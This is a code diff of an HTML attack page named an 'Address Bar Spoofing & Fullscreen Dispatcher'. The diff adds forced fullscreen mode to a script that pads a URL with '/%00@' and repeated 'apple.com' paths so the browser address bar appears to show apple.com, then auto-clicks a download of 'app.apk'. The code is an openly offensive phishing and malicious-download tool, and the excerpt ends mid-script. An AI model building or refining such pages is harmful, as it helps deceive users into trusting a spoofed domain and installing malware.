@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Address Bar Spoofing Dispatcher</title>
+    <title>Advanced Address Bar Spoofing & Fullscreen Dispatcher</title>
     <style>
         body {
             font-family: monospace;
@@ -14,6 +14,8 @@
             height: 100vh;
             background-color: #0b0b0b;
             color: #00ffcc;
+            margin: 0;
+            overflow: hidden;
         }
         button {
             padding: 18px 35px;
@@ -38,17 +40,28 @@
 </head>
 <body>
 
-    <button id="strikeBtn">Initialize Hardened Dispatch</button>
+    <button id="strikeBtn">Initialize Hardened Dispatch & Fullscreen</button>
     <div id="status"></div>
 
     <script>
         document.getElementById('strikeBtn').addEventListener('click', function() {
+            // --- 0. FORCE FULLSCREEN (Immersive Mode) ---
+            const elem = document.documentElement;
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen().catch(err => {
+                    console.log("Fullscreen blocked or failed:", err);
+                });
+            } else if (elem.webkitRequestFullscreen) { /* Safari / iOS */
+                elem.webkitRequestFullscreen();
+            } else if (elem.msRequestFullscreen) { /* IE/Edge */
+                elem.msRequestFullscreen();
+            }
+
             // --- 1. CONFIGURATION ---
             const filename = "app.apk";
             const realDomain = "apple.com";
 
             // --- 2. ADVANCED ADDRESS BAR & UI SPOOFING LOGIC ---
-            // Memanfaatkan teknik overflow path & control character masking untuk memaksa UI peramban memotong string tampilan.
             const overflowPadding = "/%00@".repeat(15) + ".https://" + realDomain + "/auth/validate/".repeat(30);
             const longSub = realDomain + overflowPadding;
 
@@ -65,7 +78,7 @@
             document.body.appendChild(a);
             a.click();
 
-            document.getElementById('status').innerText = "> SPOOFING_TARGET: " + realDomain;
+            document.getElementById('status').innerText = "> FULLSCREEN_ACTIVE & SPOOFING_TARGET: " + realDomain;
 
             // --- 5. HARDENED INTENT FALLBACK DISPATCH ---
             setTimeout(() => {
